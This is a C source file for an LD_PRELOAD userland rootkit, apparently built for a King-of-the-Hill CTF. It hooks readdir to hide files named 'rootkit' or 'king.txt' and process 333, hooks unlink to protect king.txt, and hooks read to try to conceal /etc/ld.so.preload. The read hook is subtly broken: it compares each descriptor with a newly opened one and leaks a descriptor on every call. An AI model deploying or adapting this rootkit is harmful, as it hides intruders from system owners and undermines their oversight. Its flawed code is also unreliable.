#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h> // Include this header for O_RDONLY

static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
static int (*orig_unlink)(const char *pathname) = NULL;
static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Hide files/directories containing "rootkit" or "king.txt"
        if (strstr(entry->d_name, "rootkit") == NULL && strstr(entry->d_name, "king.txt") == NULL) {
            // Hide process with a specific PID (e.g., 333)
            if (strcmp(entry->d_name, "333") == 0) {
                continue;
            }
            return entry;
        }
    }
    return NULL;
}

int unlink(const char *pathname) {
    if (!orig_unlink) {
        orig_unlink = dlsym(RTLD_NEXT, "unlink");
    }

    // Protect "king.txt" from being deleted
    if (strstr(pathname, "king.txt") != NULL) {
        errno = EACCES;
        return -1;
    }
    return orig_unlink(pathname);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!orig_read) {
        orig_read = dlsym(RTLD_NEXT, "read");
    }

    // Hide the content of /etc/ld.so.preload
    if (fd == open("/etc/ld.so.preload", O_RDONLY)) {
        return 0; // Return zero bytes to hide the content
    }

    return orig_read(fd, buf, count);
}
